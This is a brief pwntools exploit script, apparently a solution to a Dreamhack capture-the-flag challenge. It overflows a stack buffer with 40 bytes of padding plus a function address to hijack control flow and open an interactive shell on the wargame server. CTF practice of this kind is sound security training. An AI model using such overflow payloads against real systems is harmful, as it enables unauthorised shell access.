from pwn import *

r=remote("host2.dreamhack.games",9306)
print("remote success")
getshell=0x0804867b

payload="A"*40+p32(getshell)

r.send(payload)
#print(r.recv(0x10))
r.interactive()
